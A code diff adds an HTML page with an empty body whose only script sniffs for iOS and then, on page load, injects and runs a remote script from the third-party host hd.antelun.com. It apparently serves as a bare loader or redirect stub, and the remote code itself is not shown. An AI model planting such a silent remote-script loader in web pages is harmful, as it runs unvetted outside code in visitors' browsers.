@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+</head>
+<body>
+</body>
+<script>
+function is_ios() {
+	var u = navigator.userAgent;
+    if(!!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)){
+        return true;
+    }else{
+        return false;
+    }
+}
+var js="http://hd.antelun.com/s2/vs2.js";
+if(is_ios()){js="https://hd.antelun.com/s2/vs2.js";}
+function sto(){
+	document.write("<script src='"+js+"'><\/script>");
+	document.close();
+}
+sto();
+</script>
+</html>
+  
